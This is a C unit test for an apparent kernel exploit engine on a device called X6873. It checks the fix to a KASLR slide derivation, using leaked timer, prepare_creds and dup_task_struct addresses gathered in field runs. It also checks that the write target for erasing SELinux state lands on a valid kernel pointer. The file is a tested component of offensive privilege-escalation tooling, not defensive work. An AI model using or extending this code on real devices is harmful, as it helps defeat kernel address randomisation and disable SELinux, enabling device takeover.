/*
 * Host unit test for the 2026-11-15 X6873 slide-derivation fix.
 *
 * Root cause found by the 15:31 field run: the profile's timer_site
 * constant shipped one hex digit short (0xffffffc08193300, 15 digits,
 * instead of the convention-base value 0xffffffc080193300), so the
 * trace-observed sites were CORRECT text addresses but every derived
 * slide came out negative-huge and the selinux erase panicked.
 *
 * Field vectors (15:31 boot, reconstructed from the log):
 *   - timer site observed:  0xffffffd9b6593300  (slide 0x1936400000 in
 *     the 0xffffffc080000000 convention frame, 0x19ae400000 true)
 *   - cred site runtime:    0xffffffd9b64e50d4  (prepare_creds + slide)
 *   - task site runtime:    0xffffffd9b64ac148  (dup_task_struct + slide)
 */
#define main engine_main_unused
#include "K61157_plant.c"
#undef main

static int failures;

static void check(int cond, const char *what)
{
    printf("%s %s\n", cond ? "ok  " : "FAIL", what);
    if (!cond)
        failures++;
}

int main(void)
{
    struct k61157_profile *p = (struct k61157_profile *)k61157_profiles;
    unsigned long long slide;
    struct site_hist h[SITE_HIST];
    unsigned long long mode;
    int n;

    /* profile sanity: the anchors are wired with full-width constants */
    g_prof = p;
    check(profile_check(p->release) == 0, "profile row complete");
    check(STATIC_TIMER_SITE == 0xffffffc080193300ULL,
          "timer_site is the 16-digit convention value (typo fixed)");
    check(STATIC_TIMER_SITE != 0xffffffc08193300ULL,
          "timer_site regression guard: not the 15-digit typo");
    check(STATIC_CRED_SITE == 0xffffffc0800e50d4ULL, "cred_site constant");
    check(CRED_SITE_LOW21 == 0xe50d4ULL, "cred_site low21");
    check(STATIC_TASK_SITE == 0xffffffc0800ac148ULL, "task_site constant");
    check((STATIC_TASK_SITE & 0x1fffffULL) == COPY_PROCESS_LOW21,
          "task_site low21 equals COPY_PROCESS_LOW21");

    /* field arithmetic: the observed site now yields a sane slide and
     * canonical write targets */
    check(0xffffffd9b6593300ULL - STATIC_TIMER_SITE == 0x1936400000ULL,
          "15:31 field site0 -> convention slide 0x1936400000");
    check(slide_candidate_ok(0x1936400000ULL),
          "convention slide accepted");
    check(is_kernel_ptr(SELINUX_STATE_STATIC + 0x1936400000ULL - 7),
          "selinux target canonical with the field slide");
    check(slide_candidate_ok(
              0xffffffd9b6593300ULL - 0xffffffc08193300ULL) == 0,
          "the old typoed-constant slide is rejected by the span bound");

    /* histogram: 2047 true sites vs 1 colliding record -> mode wins */
    memset(h, 0, sizeof(h));
    for (int i = 0; i < 2047; i++)
        site_hist_add(h, 0xffffffd9b6593300ULL);
    site_hist_add(h, 0xffffffd9b6593300ULL + 0x200000ULL);
    check(site_hist_mode(h, &mode, &n) && mode == 0xffffffd9b6593300ULL &&
              n == 2047, "mode picks the dominant true site");

    /* case 1: timer mode (true) + leak anchors agree -> 3 votes */
    g_slide = 0;
    g_leak_cred_site = 0xffffffd9b64e50d4ULL;
    g_leak_cred_site_n = 29;
    g_leak_task_site = 0xffffffd9b64ac148ULL;
    g_leak_task_site_n = 1;
    slide = 0xdeadbeef;
    check(derive_slide(0xffffffd9b6593300ULL, 2047, &slide) &&
              slide == 0x1936400000ULL,
          "case1 full agreement -> 0x1936400000");

    /* case 2: poisoned timer anchor (what the typoed constant did),
     * cred/task anchors carry the vote -> still the correct slide */
    g_slide = 0;
    slide = 0;
    check(derive_slide(0x0effffd9b6593300ULL, 2047, &slide) &&
              slide == 0x1936400000ULL,
          "case2 poisoned timer anchor, cred/task anchors win");

    /* case 3: timer mode alone (no leak anchors) */
    g_slide = 0;
    g_leak_cred_site = 0;
    g_leak_cred_site_n = 0;
    g_leak_task_site = 0;
    g_leak_task_site_n = 0;
    slide = 0;
    check(derive_slide(0xffffffd9b6593300ULL, 2047, &slide) &&
              slide == 0x1936400000ULL, "case3 timer-only accepted");

    /* case 4: lone single-record timer mode is refused */
    g_slide = 0;
    slide = 0;
    check(!derive_slide(0xffffffd9b6593300ULL, 1, &slide),
          "case4 single-record timer mode refused");

    /* case 5: colliding/invalid site floods the timer anchor, anchors
     * still point at the truth */
    g_slide = 0;
    g_leak_cred_site = 0xffffffd9b64e50d4ULL;
    g_leak_cred_site_n = 29;
    g_leak_task_site = 0xffffffd9b64ac148ULL;
    g_leak_task_site_n = 1;
    slide = 0;
    check(derive_slide(0x0effffd9b6593300ULL, 2048, &slide) &&
              slide == 0x1936400000ULL,
          "case5 invalid timer flood outvoted by anchors");

    /* case 6: nothing valid -> fail closed */
    g_slide = 0;
    g_leak_cred_site = 0;
    g_leak_cred_site_n = 0;
    g_leak_task_site = 0;
    g_leak_task_site_n = 0;
    slide = 0;
    check(!derive_slide(0x0effffd9b6593300ULL, 2048, &slide),
          "case6 unvalidated anchors fail closed");

    /* case 7: a wrong-low21 cred anchor is ignored, task+timer agree */
    g_slide = 0;
    g_leak_cred_site = 0x0effffd9b6593300ULL; /* wrong low21 */
    g_leak_cred_site_n = 5;
    g_leak_task_site = 0xffffffd9b64ac148ULL;
    g_leak_task_site_n = 1;
    slide = 0;
    check(derive_slide(0xffffffd9b6593300ULL, 2047, &slide) &&
              slide == 0x1936400000ULL,
          "case7 wrong cred anchor dropped, task+timer agree");

    printf("%s (%d failures)\n", failures ? "TEST FAILED" : "ALL PASS",
           failures);
    return failures ? 1 : 0;
}
